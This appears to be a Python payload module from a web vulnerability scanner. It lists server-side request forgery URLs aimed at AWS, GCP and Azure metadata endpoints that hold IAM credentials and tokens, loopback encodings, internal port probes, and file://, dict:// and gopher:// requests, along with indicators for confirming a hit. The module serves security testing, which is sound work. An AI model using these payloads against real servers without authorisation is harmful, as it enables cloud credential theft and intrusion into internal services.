"""
web/payloads/ssrf.py
--------------------
Server-Side Request Forgery (SSRF) payload library for Raven Phase 8.

Covers:
  - Cloud metadata endpoints (AWS, GCP, Azure)
  - Internal network probing (localhost, loopback variants)
  - Protocol confusion (gopher://, dict://, file://)
  - DNS rebinding indicators
  - Port scanning probes

IMPORTANT: SSRF confirmation requires the target server to actually fetch
the URL and return evidence (metadata JSON, service banner, etc.).
Without a DNS callback server, truly blind SSRF cannot be confirmed
automatically — the AI advisor will flag these as requiring manual
verification with a tool like Burp Collaborator.
"""

from __future__ import annotations

from web.payloads import PayloadContext

# ── Raw payload strings ────────────────────────────────────────────────────────

PAYLOADS: list[str] = [
    # ── AWS IMDSv1 ────────────────────────────────────────────────────────────
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # ── AWS IMDSv2 (requires token — will fail gracefully) ────────────────────
    "http://169.254.169.254/latest/api/token",
    # ── GCP metadata ─────────────────────────────────────────────────────────
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # ── Azure IMDS ────────────────────────────────────────────────────────────
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
    # ── Localhost / loopback variants ─────────────────────────────────────────
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0177.0.0.1/",           # Octal encoding of 127.0.0.1
    "http://2130706433/",            # Decimal encoding of 127.0.0.1
    # ── Internal port probing ─────────────────────────────────────────────────
    "http://localhost:22/",          # SSH
    "http://localhost:3306/",        # MySQL
    "http://localhost:5432/",        # PostgreSQL
    "http://localhost:6379/",        # Redis
    "http://localhost:27017/",       # MongoDB
    "http://localhost:8080/",        # Alt HTTP
    # ── Protocol confusion ────────────────────────────────────────────────────
    "file:///etc/passwd",
    "file:///c:/windows/system32/drivers/etc/hosts",
    "dict://localhost:6379/info",
    "gopher://localhost:6379/_INFO%0d%0a",
    # ── DNS rebinding (canary) — requires manual verification ─────────────────
    "http://ssrf.burpcollaborator.net/",
]

# ── Expected indicators for SSRF confirmation ─────────────────────────────────

#: Response body strings that confirm the server fetched an internal resource.
SSRF_INDICATORS: list[str] = [
    "ami-id",
    "instance-id",
    "local-hostname",
    "iam",
    "security-credentials",
    "computeMetadata",
    "numericProjectId",
    "access_token",
    "Bearer ",
    "root:x:0:0",
    "+OK ",                           # Redis PONG
    "redis_version",
    "$",                              # Redis bulk string prefix
    "SSH-2.0",
    "220 ",                           # SMTP/FTP banner
]

# ── Rich payload metadata ──────────────────────────────────────────────────────

CONTEXTS: list[PayloadContext] = [
    PayloadContext(
        payload="http://169.254.169.254/latest/meta-data/",
        injection_type="query_param",
        expected_indicator="ami-id",
        severity="Critical",
        vuln_type="SSRF",
    ),
    PayloadContext(
        payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        injection_type="query_param",
        expected_indicator="security-credentials",
        severity="Critical",
        vuln_type="SSRF",
    ),
    PayloadContext(
        payload="http://metadata.google.internal/computeMetadata/v1/",
        injection_type="query_param",
        expected_indicator="computeMetadata",
        severity="Critical",
        vuln_type="SSRF",
    ),
    PayloadContext(
        payload="http://localhost/",
        injection_type="query_param",
        expected_indicator="localhost",
        severity="High",
        vuln_type="SSRF",
    ),
    PayloadContext(
        payload="http://127.0.0.1/",
        injection_type="query_param",
        expected_indicator="127.0.0.1",
        severity="High",
        vuln_type="SSRF",
    ),
    PayloadContext(
        payload="http://localhost:6379/",
        injection_type="query_param",
        expected_indicator="redis_version",
        severity="Critical",
        vuln_type="SSRF",
    ),
    PayloadContext(
        payload="file:///etc/passwd",
        injection_type="query_param",
        expected_indicator="root:x:0:0",
        severity="Critical",
        vuln_type="SSRF",
    ),
    PayloadContext(
        payload="dict://localhost:6379/info",
        injection_type="query_param",
        expected_indicator="redis_version",
        severity="Critical",
        vuln_type="SSRF",
    ),
]
